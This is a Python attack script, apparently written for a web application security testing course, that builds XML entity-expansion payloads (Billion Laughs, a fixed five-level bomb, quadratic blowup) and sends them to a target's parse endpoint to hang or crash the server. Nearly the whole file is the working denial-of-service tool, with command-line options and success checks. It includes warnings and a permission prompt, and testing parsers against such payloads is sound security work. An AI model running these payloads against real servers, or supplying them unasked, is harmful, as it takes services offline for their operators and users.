#!/usr/bin/env python3
"""
XXE Billion Laughs DoS Attack
==============================

This script demonstrates a Denial of Service (DoS) attack using
XML entity expansion (Billion Laughs / XML Bomb).

WARNING: This can crash or hang the target server!
EDUCATIONAL PURPOSES ONLY!

Author: Adrian Kapczynski
Course: Web and Mobile Application Security Testing
"""

import requests
import sys
import argparse
import time
from urllib.parse import urljoin


class XXEDoS:
    """
    XXE DoS exploit using Billion Laughs attack
    """

    def __init__(self, target_url, verbose=False):
        """
        Initialize the exploit

        Args:
            target_url (str): Base URL of the vulnerable application
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.verbose = verbose
        self.endpoint = urljoin(target_url, '/api/parse')

    def log(self, message):
        """Print message if verbose mode is enabled"""
        if self.verbose:
            print(f"[*] {message}")

    def create_billion_laughs_payload(self, depth=10):
        """
        Create Billion Laughs XML bomb payload

        Args:
            depth (int): Recursion depth (default 10, use lower for testing)

        Returns:
            str: XML payload with recursive entities
        """
        # Start with base entity
        entities = ['<!ENTITY lol "lol">']

        # Create recursive entities
        for i in range(1, depth):
            prev = f"lol{i - 1}" if i > 1 else "lol"
            entity = f'<!ENTITY lol{i} "{" ".join(["&" + prev + ";" for _ in range(10)])}">'
            entities.append(entity)

        # Create final entity name
        final_entity = f"lol{depth - 1}"

        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  {chr(10).join(entities)}
]>
<lolz>&{final_entity};</lolz>"""
        return payload

    def create_simple_dos_payload(self):
        """
        Create a simpler DoS payload (less aggressive)

        Returns:
            str: Simple DOS XML payload
        """
        payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>"""
        return payload

    def create_xxe_quadratic_blowup(self):
        """
        Create XXE Quadratic Blowup payload (alternative DoS)

        Returns:
            str: Quadratic blowup payload
        """
        # Create a large string that will be repeated many times
        large_string = "A" * 10000

        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE kaboom [
  <!ENTITY a "{large_string}">
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>"""
        return payload

    def exploit(self, attack_type='simple', depth=5):
        """
        Execute DoS attack

        Args:
            attack_type (str): Type of attack ('simple', 'billion_laughs', 'quadratic')
            depth (int): Recursion depth for billion_laughs

        Returns:
            tuple: (success: bool, message: str, time_taken: float)
        """
        self.log(f"Target: {self.target_url}")
        self.log(f"Attack type: {attack_type}")

        # Create appropriate payload
        if attack_type == 'billion_laughs':
            payload = self.create_billion_laughs_payload(depth)
            attack_name = f"Billion Laughs (depth {depth})"
        elif attack_type == 'quadratic':
            payload = self.create_xxe_quadratic_blowup()
            attack_name = "Quadratic Blowup"
        else:  # simple
            payload = self.create_simple_dos_payload()
            attack_name = "Simple DoS"

        self.log(f"Payload created: {attack_name}")

        if self.verbose:
            print("\n" + "=" * 60)
            print(f"PAYLOAD ({attack_name}):")
            print("=" * 60)
            print(payload[:500] + "..." if len(payload) > 500 else payload)
            print("=" * 60 + "\n")

        try:
            # Measure time
            start_time = time.time()

            self.log("Sending DoS payload...")
            self.log("‚ö†Ô∏è  Server may slow down or hang...")

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'XXE-DoS-Exploit/1.0'
            }

            # Set longer timeout as server might be slow
            response = requests.post(
                self.endpoint,
                data={'xml_content': payload},
                headers=headers,
                timeout=30
            )

            end_time = time.time()
            time_taken = end_time - start_time

            self.log(f"Response received in {time_taken:.2f} seconds")
            self.log(f"Response status: {response.status_code}")

            # Check response
            if response.status_code == 200:
                # Server processed it - might have limits
                return False, "Server processed the payload (has DoS protection)", time_taken
            elif response.status_code == 500:
                return True, "Server error - DoS may have succeeded", time_taken
            else:
                return False, f"Unexpected response: {response.status_code}", time_taken

        except requests.exceptions.Timeout:
            end_time = time.time()
            time_taken = end_time - start_time
            return True, "Request timeout - Server likely overwhelmed!", time_taken
        except requests.exceptions.ConnectionError:
            end_time = time.time()
            time_taken = end_time - start_time
            return True, "Connection error - Server may have crashed!", time_taken
        except Exception as e:
            end_time = time.time()
            time_taken = end_time - start_time
            return True, f"Exception occurred: {str(e)}", time_taken


def print_banner():
    """Print exploit banner"""
    banner = """
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                           ‚ïë
‚ïë           XXE Billion Laughs DoS Attack                   ‚ïë
‚ïë         Denial of Service via Entity Expansion            ‚ïë
‚ïë                                                           ‚ïë
‚ïë           ‚ö†Ô∏è  CAN CRASH THE TARGET SERVER! ‚ö†Ô∏è            ‚ïë
‚ïë           [!] EDUCATIONAL PURPOSES ONLY [!]              ‚ïë
‚ïë                                                           ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
    """
    print(banner)


def main():
    """Main function"""
    print_banner()

    parser = argparse.ArgumentParser(
        description='XXE Billion Laughs DoS Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Simple DoS attack (safest for testing)
  python dos_attack.py -t http://127.0.0.1:5000

  # Billion Laughs with custom depth
  python dos_attack.py -t http://127.0.0.1:5000 --type billion_laughs --depth 5

  # Quadratic blowup attack
  python dos_attack.py -t http://127.0.0.1:5000 --type quadratic

  # Verbose mode
  python dos_attack.py -t http://127.0.0.1:5000 -v

Attack Types:
  simple          : Simple entity expansion (5 levels)
  billion_laughs  : Classic Billion Laughs with custom depth
  quadratic       : Quadratic blowup attack

WARNING: These attacks can crash or hang the target server!
Only use against systems you own or have permission to test.
        """
    )

    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target URL (e.g., http://127.0.0.1:5000)'
    )

    parser.add_argument(
        '--type',
        choices=['simple', 'billion_laughs', 'quadratic'],
        default='simple',
        help='Attack type (default: simple)'
    )

    parser.add_argument(
        '--depth',
        type=int,
        default=5,
        help='Recursion depth for billion_laughs (default: 5, max: 10)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )

    args = parser.parse_args()

    # Validate depth
    if args.depth > 10:
        print("‚ö†Ô∏è  Warning: Depth > 10 can cause severe system issues!")
        response = input("Continue anyway? (yes/no): ")
        if response.lower() != 'yes':
            print("Aborted.")
            sys.exit(0)

    # Create exploit instance
    exploit = XXEDoS(args.target, verbose=args.verbose)

    # Warning
    print("\n" + "‚ö†Ô∏è " * 20)
    print("WARNING: This attack can crash or hang the target server!")
    print("Only proceed if you have permission to test this system.")
    print("‚ö†Ô∏è " * 20 + "\n")

    response = input("Do you want to continue? (yes/no): ")
    if response.lower() != 'yes':
        print("\n[!] Attack aborted by user.")
        sys.exit(0)

    # Run exploit
    print(f"\n[+] Target: {args.target}")
    print(f"[+] Attack type: {args.type}")
    if args.type == 'billion_laughs':
        print(f"[+] Recursion depth: {args.depth}")
    print("[+] Launching DoS attack...\n")

    success, message, time_taken = exploit.exploit(args.type, args.depth)

    # Display results
    print("\n" + "=" * 60)
    if success:
        print("üí• DoS ATTACK MAY HAVE SUCCEEDED!")
    else:
        print("‚ö†Ô∏è  DoS ATTACK BLOCKED OR LIMITED")
    print("=" * 60)

    print(f"\nResult: {message}")
    print(f"Time taken: {time_taken:.2f} seconds")

    if not success:
        print("\n[+] The server has DoS protection (good security!)")
        print("[+] Modern parsers like lxml have entity expansion limits.")
    else:
        print("\n[!] Server appears vulnerable to DoS attacks!")
        print("[!] Check if the target application is still responding.")

    print("\n" + "=" * 60)


if __name__ == '__main__':
    main()